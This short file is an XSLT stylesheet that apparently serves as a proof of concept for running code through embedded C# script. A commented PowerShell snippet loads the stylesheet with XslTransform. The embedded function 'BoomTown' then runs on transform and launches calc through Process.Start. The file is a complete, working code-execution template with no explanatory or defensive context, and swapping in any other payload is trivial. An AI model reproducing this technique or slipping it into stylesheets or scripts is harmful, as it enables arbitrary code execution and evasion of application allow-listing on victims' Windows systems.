<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"  
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"  
  xmlns:u="urn:my-scripts">  
    <!-- 	
	'<a/>' > blah.txt
	$xslt = New-Object System.Xml.Xsl.XslTransform
	$xslt.Load("$pwd\JankyAF.xsl");
	$xslt.Transform("$pwd\blah.txt","$pwd\blah.txt")
  -->
  <msxsl:script language="C#" implements-prefix="u">  
    <![CDATA[  
  public void BoomTown(){ System.Diagnostics.Process.Start("calc"); }  
  ]]>  
  </msxsl:script>  
  <xsl:template match="/">  
	<xsl:value-of select="u:BoomTown()"/>               
  </xsl:template>  
</xsl:stylesheet>